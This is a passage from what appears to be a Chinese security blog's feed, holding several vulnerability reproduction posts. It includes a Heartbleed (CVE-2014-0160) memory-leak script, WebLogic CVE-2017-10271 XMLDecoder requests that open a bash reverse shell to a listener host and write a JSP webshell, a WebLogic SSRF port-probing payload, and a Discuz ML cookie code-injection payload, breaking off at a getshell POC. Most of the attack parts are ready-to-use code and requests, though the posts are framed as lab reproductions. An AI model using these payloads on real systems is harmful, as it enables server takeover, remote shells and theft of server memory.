class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span><br><span class="line"># The author disclaims copyright to this source code.</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">import select</span><br><span class="line">import re</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"></span><br><span class="line">options &#x3D; OptionParser(usage&#x3D;&#39;%prog server [options]&#39;, description&#x3D;&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;)</span><br><span class="line">options.add_option(&#39;-p&#39;, &#39;--port&#39;, type&#x3D;&#39;int&#39;, default&#x3D;443, help&#x3D;&#39;TCP port to test (default: 443)&#39;)</span><br><span class="line"></span><br><span class="line">def h2bin(x):</span><br><span class="line">    return x.replace(&#39; &#39;, &#39;&#39;).replace(&#39;\n&#39;, &#39;&#39;).decode(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">hello &#x3D; h2bin(&#39;&#39;&#39;</span><br><span class="line">16 03 02 00  dc 01 00 00 d8 03 02 53</span><br><span class="line">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span><br><span class="line">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span><br><span class="line">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span><br><span class="line">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span><br><span class="line">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span><br><span class="line">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span><br><span class="line">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span><br><span class="line">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span><br><span class="line">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span><br><span class="line">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span><br><span class="line">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span><br><span class="line">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span><br><span class="line">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span><br><span class="line">00 0f 00 01 01                                  </span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">hb &#x3D; h2bin(&#39;&#39;&#39; </span><br><span class="line">18 03 02 00 03</span><br><span class="line">01 40 00</span><br><span class="line">&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">def hexdump(s):</span><br><span class="line">    for b in xrange(0, len(s), 16):</span><br><span class="line">        lin &#x3D; [c for c in s[b : b + 16]]</span><br><span class="line">        hxdat &#x3D; &#39; &#39;.join(&#39;%02X&#39; % ord(c) for c in lin)</span><br><span class="line">        pdat &#x3D; &#39;&#39;.join((c if 32 &lt;&#x3D; ord(c) &lt;&#x3D; 126 else &#39;.&#39; )for c in lin)</span><br><span class="line">        print &#39;  %04x: %-48s %s&#39; % (b, hxdat, pdat)</span><br><span class="line">    print</span><br><span class="line"></span><br><span class="line">def recvall(s, length, timeout&#x3D;5):</span><br><span class="line">    endtime &#x3D; time.time() + timeout</span><br><span class="line">    rdata &#x3D; &#39;&#39;</span><br><span class="line">    remain &#x3D; length</span><br><span class="line">    while remain &gt; 0:</span><br><span class="line">        rtime &#x3D; endtime - time.time() </span><br><span class="line">        if rtime &lt; 0:</span><br><span class="line">            return None</span><br><span class="line">        r, w, e &#x3D; select.select([s], [], [], 5)</span><br><span class="line">        if s in r:</span><br><span class="line">            data &#x3D; s.recv(remain)</span><br><span class="line">            # EOF?</span><br><span class="line">            if not data:</span><br><span class="line">                return None</span><br><span class="line">            rdata +&#x3D; data</span><br><span class="line">            remain -&#x3D; len(data)</span><br><span class="line">    return rdata</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">def recvmsg(s):</span><br><span class="line">    hdr &#x3D; recvall(s, 5)</span><br><span class="line">    if hdr is None:</span><br><span class="line">        print &#39;Unexpected EOF receiving record header - server closed connection&#39;</span><br><span class="line">        return None, None, None</span><br><span class="line">    typ, ver, ln &#x3D; struct.unpack(&#39;&gt;BHH&#39;, hdr)</span><br><span class="line">    pay &#x3D; recvall(s, ln, 10)</span><br><span class="line">    if pay is None:</span><br><span class="line">        print &#39;Unexpected EOF receiving record payload - server closed connection&#39;</span><br><span class="line">        return None, None, None</span><br><span class="line">    print &#39; ... received message: type &#x3D; %d, ver &#x3D; %04x, length &#x3D; %d&#39; % (typ, ver, len(pay))</span><br><span class="line">    return typ, ver, pay</span><br><span class="line"></span><br><span class="line">def hit_hb(s):</span><br><span class="line">    s.send(hb)</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay &#x3D; recvmsg(s)</span><br><span class="line">        if typ is None:</span><br><span class="line">            print &#39;No heartbeat response received, server likely not vulnerable&#39;</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">        if typ &#x3D;&#x3D; 24:</span><br><span class="line">            print &#39;Received heartbeat response:&#39;</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            if len(pay) &gt; 3:</span><br><span class="line">                print &#39;WARNING: server returned more data than it should - server is vulnerable!&#39;</span><br><span class="line">            else:</span><br><span class="line">                print &#39;Server processed malformed heartbeat, but did not return any extra data.&#39;</span><br><span class="line">            return True</span><br><span class="line"></span><br><span class="line">        if typ &#x3D;&#x3D; 21:</span><br><span class="line">            print &#39;Received alert:&#39;</span><br><span class="line">            hexdump(pay)</span><br><span class="line">            print &#39;Server returned error, likely not vulnerable&#39;</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    opts, args &#x3D; options.parse_args()</span><br><span class="line">    if len(args) &lt; 1:</span><br><span class="line">        options.print_help()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    print &#39;Connecting...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.connect((args[0], opts.port))</span><br><span class="line">    print &#39;Sending Client Hello...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hello)</span><br><span class="line">    print &#39;Waiting for Server Hello...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    while True:</span><br><span class="line">        typ, ver, pay &#x3D; recvmsg(s)</span><br><span class="line">        if typ &#x3D;&#x3D; None:</span><br><span class="line">            print &#39;Server closed connection without sending Server Hello.&#39;</span><br><span class="line">            return</span><br><span class="line">        # Look for server hello done message.</span><br><span class="line">        if typ &#x3D;&#x3D; 22 and ord(pay[0]) &#x3D;&#x3D; 0x0E:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    print &#39;Sending heartbeat request...&#39;</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    s.send(hb)</span><br><span class="line">    hit_hb(s)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础</title>
      <link href="/2019/08/26/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/08/26/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="PHP代码审计基础"><a href="#PHP代码审计基础" class="headerlink" title="PHP代码审计基础"></a>PHP代码审计基础</h3><ul><li><a href="#_2">思维导图</a></li><li><ul><li><a href="#_4">新的改变</a></li></ul></li></ul><h1 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h1><p><img src="https://img-blog.csdnimg.cn/20190311085916924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZseV9ocHM=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="新的改变"><a href="#新的改变" class="headerlink" title="新的改变"></a>新的改变</h2><p>论PHP常见的漏洞<br>′ 雨。 · 2015/01/14 10:08</p><p><a href="http://www.anquan.us/static/drops/papers-4544.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/papers-4544.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】weblogic漏洞系列XMLDecoder 反序列化漏洞（CVE-2017-10271）</title>
      <link href="/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/"/>
      <url>/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】weblogic漏洞系列-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#【研究】weblogic漏洞系列-‘wls-wsat’-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="【研究】weblogic漏洞系列- ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>【研究】weblogic漏洞系列- ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）</h3><ul><li><ul><li><a href="#1_2">1.环境</a></li><li><a href="#2_7">2.原理</a></li><li><a href="#3_13">3.影响版本</a></li><li><a href="#4_19">4.利用过程</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Oracle WebLogic Server 10.3.6.0.0版本</p><p>Oracle WebLogic Server 12.1.3.0.0版本</p><p>Oracle WebLogic Server 12.2.1.1.0版本</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>POC反弹shell<br>反弹shell的语句，需要进行编码，，否则解析XML的时候将出现格式错误</p><p><strong>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: 10.77.0.130:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 634</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.77.0.58&#x2F;666 0&gt;&amp;1&lt;&#x2F;string&gt;</span><br><span class="line">&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;array&gt;</span><br><span class="line">&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;</span><br><span class="line">&lt;&#x2F;java&gt;</span><br><span class="line">&lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>反弹SHell成功<br><img src="https://img-blog.csdnimg.cn/20190815164715796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问：<a href="http://your-ip:7001/bea\_wls\_internal/test.jsp" target="_blank" rel="noopener">http://your-ip:7001/bea\_wls\_internal/test.jsp</a><br>写入webshell的POC<br>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.txt写文件。<br>文件名称为xxxx文件内容为xxxx<br>成功发送请求之后服务器会返回 500 status code。<br>需要注意的地方是头部必须加上Content-Type: text/xml请求会出错。</p><p><strong>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">Content-Length: 638</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span><br><span class="line">    &lt;soapenv:Header&gt;</span><br><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span><br><span class="line">    &lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">    &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span><br><span class="line">    &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test&quot;); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    &lt;&#x2F;string&gt;</span><br><span class="line">    &lt;&#x2F;void&gt;</span><br><span class="line">    &lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt;</span><br><span class="line">    &lt;&#x2F;work:WorkContext&gt;</span><br><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span><br><span class="line">    &lt;soapenv:Body&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2019081517241877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传路径为<a href="http://10.77.0.130:7001/bea\_wls\_internal/tt.jsp" target="_blank" rel="noopener">http://10.77.0.130:7001/bea\_wls\_internal/tt.jsp</a></p><p><img src="https://img-blog.csdnimg.cn/20190815172826461.png" alt="在这里插入图片描述"></p><p>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</p><p>注意实验环境不能只有ip 还有端口 10.77.0.130:7001</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】weblogic漏洞系列-SSRF漏洞</title>
      <link href="/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/15/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91weblogic%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%97-SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="【研究】weblogic漏洞系列-SSRF漏洞"><a href="#【研究】weblogic漏洞系列-SSRF漏洞" class="headerlink" title="【研究】weblogic漏洞系列-SSRF漏洞"></a>【研究】weblogic漏洞系列-SSRF漏洞</h3><ul><li><ul><li><a href="#1_3">1.环境</a></li><li><a href="#2_8">2.原理</a></li><li><a href="#3_12">3.影响版本</a></li><li><a href="#4_14">4.利用过程</a></li><li><a href="#HTTPRedisshell_51">注入HTTP头，利用Redis反弹shell</a></li></ul></li></ul><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br><a href="https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/README.zh-cn.md</a><br>这个搭环境很方便快捷，具体可以看说明，很简单</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。<br>访问<code>http://ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer</p><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>环境打开</p><p>SSRF漏洞存在于<code>http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code>，直接访问</p><p><img src="https://img-blog.csdnimg.cn/20190815150021563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>payload:<br>?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=<a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a></p><p>加入url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.77.0.130:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;127.0.0.1:7001</span><br></pre></td></tr></table></figure><p>`</p><p>关键点是operator这个参数</p><ul><li>可访问的端口将会得到错误，访问7001端口时返回一个404的状态码。</li><li>修改为一个不存在的端口，将会返回<code>could not connect over HTTP to server</code></li></ul><p>存在<br><img src="https://img-blog.csdnimg.cn/20190815151338337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不存在<br><img src="https://img-blog.csdnimg.cn/20190815151345115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>内网端口探测</p><p>我们可以根据返回的不同状态信息，来判断内网的IP是否存在以及对应端口是否开放。这里有一个地方需要注意的是，需要知道目标内网网段。如果盲目的去进行网段扫描会耗费大量的时间。</p><p>实战挖掘中发现这个位置有可能会泄露内网网段。</p><p>实战存在的情况<br><img src="https://img-blog.csdnimg.cn/2019081515211894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h2><p>下一遍分开写吧，是可以的</p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析weblogic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Discuz Ml v3.x 前台Getshell姿势 Discuz漏洞</title>
      <link href="/2019/07/14/Discuz%20Ml%20v3.x%20%E5%89%8D%E5%8F%B0Getshell%E5%A7%BF%E5%8A%BF%20Discuz%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/07/14/Discuz%20Ml%20v3.x%20%E5%89%8D%E5%8F%B0Getshell%E5%A7%BF%E5%8A%BF%20Discuz%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="Discuz-Ml-v3-x-前台Getshell姿势"><a href="#Discuz-Ml-v3-x-前台Getshell姿势" class="headerlink" title="Discuz Ml v3.x 前台Getshell姿势"></a>Discuz Ml v3.x 前台Getshell姿势</h3><ul><li><ul><li><a href="#1_2">1.漏洞描述</a></li><li><a href="#2_10">2.原理</a></li><li><a href="#3_20">3.影响版本</a></li><li><a href="#4_26">4.利用过程</a></li><li><a href="#4getshell_POC_46">4.getshell POC</a></li><li><a href="#_68">请勿用于非法用途</a></li></ul></li></ul><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1.漏洞描述"></a>1.漏洞描述</h2><p>Discuz！ML是一个由CodersClub.org创建的多语言，集成，功能齐全的开源网络平台，用于构建像“社交网络”这样的互联网社区。</p><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，进行远程代码执行利用，该漏洞利用方式简单，危害性较大。</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p><strong>Discuz! ML v.3.4<br>Discuz! ML v.3.3<br>Discuz! ML v.3.2</strong></p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>简而言之，通过cookie传入payload，构造好的payload被写入template文件中:</p><p>注意这是国际版的，不是国内的那种，一般要有语言选择的才行，大部分都是国外的论坛<br>类似于有这种的<br><img src="https://img-blog.csdnimg.cn/20190714182907753.png" alt="在这里插入图片描述"></p><p>问题出在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXX_language&#x3D;</span><br></pre></td></tr></table></figure><p>测试PAYLOAD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XXXX_language&#x3D;&#39;.phpinfo().&#39;;</span><br></pre></td></tr></table></figure><p>XXX自己改一下<br><img src="https://img-blog.csdnimg.cn/20190714183142897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>GO一下看结果<br><img src="https://img-blog.csdnimg.cn/20190714183208411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="4-getshell-POC"><a href="#4-getshell-POC" class="headerlink" title="4.getshell POC"></a>4.getshell POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 